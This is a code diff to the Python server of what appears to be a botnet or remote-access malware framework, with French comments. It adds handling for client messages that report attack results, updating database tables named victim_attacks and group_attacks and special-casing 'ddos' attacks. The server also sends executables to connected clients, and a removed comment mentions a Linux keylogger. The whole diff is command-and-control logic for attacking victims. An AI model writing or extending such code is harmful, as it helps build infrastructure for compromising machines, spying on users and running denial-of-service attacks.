@@ -7,6 +7,7 @@ import select
 import threading
 import rsa
 import base64
+import re
 
 from env import *
 from database import *
@@ -259,20 +260,35 @@ def start_server(port):
                 print(client['addr'])
                 print("received data : " + str(pt))
 
-                client_message = json.loads(pt)
+                client_message = json.loads(re.sub('\n', '', pt))
 
-                #{"request":"XXX"}
+                # Demande d'executable {"request":"XXX"}
+                # Retour d'attaque : {"id":"XXX","attack":"XXX","output":"XXX"}
 
                 if "request" in client_message:
                     # envoyer l'executable au client
                     send_executable_to_client(client_message["request"], client['os'], client['sym_key'], client['iv'], client['reception_queue'], client['emission_queue'])
 
-                else :
+                elif "attack" in client_message :
                     # interpreter le resultat de l'attaque
-                    print("a")
+                    attack_type = client_message["attack"]
+                    attack_id = client_message["id"]
+                    attack_output = client_message["output"]
+
+                    # Mise à jour de l'attaque
+                    if attack_type == "ddos":
+                        query = "UPDATE group_attacks SET state = 'done', result = %s WHERE id = %s"
+                    else :
+                        query = "UPDATE victim_attacks SET state = 'done', result = %s WHERE id = %s"
+                    
+                    values = (attack_output, attack_id, )
+                    mycursor.execute(query, values)
+
+                    db.commit()
 
 
-                # REQUEST keylogger linux
+                    print("[+] attack updated in the database (done !)")
+
 
             except Empty:
                 pass
